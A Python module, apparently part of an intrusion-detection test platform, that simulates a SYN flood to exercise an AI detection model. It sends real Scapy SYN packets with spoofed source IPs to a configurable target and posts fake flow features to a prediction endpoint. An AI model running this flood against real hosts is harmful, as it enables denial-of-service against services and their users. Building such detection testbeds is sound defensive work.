from scapy.all import IP, TCP, send, RandShort
import asyncio
from typing import Dict, Any, Callable, Coroutine
from .simulation_params import SYNFloodParams
from app.core import state # AI modelini beslemek için
import random
import httpx
import os

INTERNAL_API_BASE_URL = os.getenv("INTERNAL_API_BASE_URL", "http://localhost:8000")

def generate_fake_synflood_features():
    """SYN Flood saldırısını taklit eden sahte özellikler üretir."""
    if not state.feature_columns:
        print("⚠️ Feature columns not loaded. Cannot generate fake features for SYN Flood.")
        return {}
    
    features = {key: 0.0 for key in state.feature_columns}
    features.update({
        'Flow Duration': random.uniform(1000, 50000),      # Kısa süreli, çok sayıda akış
        'Total Fwd Packets': 1.0,                           # Sadece bir SYN paketi
        'Total Backward Packets': 0.0,                      # Cevap yok (veya beklenmiyor)
        'Fwd Packet Length Max': 0.0,                       # SYN paketlerinin payload'ı yoktur
        'Flow IAT Mean': random.uniform(1, 100),            # Akışlar arası çok kısa süre
        'SYN Flag Count': 1,                                # Bu özelliğin modelinizde olması gerekir
        'Init_Win_bytes_forward': random.randint(1024, 65535),
        'Init_Win_bytes_backward': 0
    })
    return features

async def trigger_prediction(simulation_id: str):
    """AI modelinin tahmin endpoint'ini tetikler."""
    try:
        features = generate_fake_synflood_features()
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{INTERNAL_API_BASE_URL}/api/predict",
                json={"features": features, "source_info": f"synflood_simulation_{simulation_id}"},
                timeout=10.0
            )
    except Exception as e:
        print(f"❌ Error during SYN Flood prediction trigger: {e}")

async def run_synflood_simulation(
    params: SYNFloodParams,
    progress_callback: Callable[[Dict[str, Any]], Coroutine[Any, Any, None]],
    simulation_run_id: str
) -> Dict[str, Any]:
    """
    Scapy kullanarak hedefe SYN Flood saldırısı simüle eder.
    DİKKAT: Bu fonksiyon, root/admin yetkileriyle çalıştırılmalıdır.
    Docker içinde genellikle bu sorun olmaz.
    """
    print(f"Starting SYN Flood Simulation: Target={params.target_ip}:{params.target_port}")
    sent_packets = 0
    
    await progress_callback({
        "type": "progress", "message": "Initiating SYN Flood...",
        "completed": 0, "total": params.num_packets
    })

    try:
        for i in range(params.num_packets):
            # Her pakette kaynak IP'yi ve portu rastgele seçerek sahtecilik (spoofing) yapıyoruz
            # Bu, gerçek bir saldırıyı daha iyi taklit eder.
            ip_layer = IP(src=f"192.168.1.{random.randint(1, 254)}", dst=params.target_ip)
            tcp_layer = TCP(sport=RandShort(), dport=params.target_port, flags="S") # 'S' -> SYN bayrağı
            
            packet = ip_layer / tcp_layer
            
            # Paketi gönder. verbose=0, ekrana çıktı basmasını engeller.
            send(packet, verbose=0)
            sent_packets += 1

            # Her N pakette bir ilerleme bildir ve AI modelini tetikle
            if sent_packets % 50 == 0 or sent_packets == params.num_packets:
                await progress_callback({
                    "type": "progress",
                    "message": f"Sent {sent_packets}/{params.num_packets} SYN packets...",
                    "completed": sent_packets,
                    "total": params.num_packets
                })
                # AI tetikleme işlemini arkaplanda çalıştır
                asyncio.create_task(trigger_prediction(simulation_run_id))
            
            # Paketler arasına küçük bir gecikme ekle
            if params.delay_seconds > 0:
                await asyncio.sleep(params.delay_seconds)
        
    except Exception as e:
        error_message = f"An error occurred during SYN Flood: {e}. Note: Sending raw packets might require root/administrator privileges."
        print(f"❌ {error_message}")
        await progress_callback({"type": "error", "message": error_message})
        # Hata durumunda bile sonucu döndür
        return {
            "target_ip": params.target_ip,
            "target_port": params.target_port,
            "total_packets_sent": sent_packets,
            "status": "Failed",
            "error": str(e)
        }


    result = {
        "target_ip": params.target_ip,
        "target_port": params.target_port,
        "total_packets_sent": sent_packets,
        "status": "Completed"
    }

    await progress_callback({"type": "final_summary", "message": "SYN Flood simulation completed."})
    return result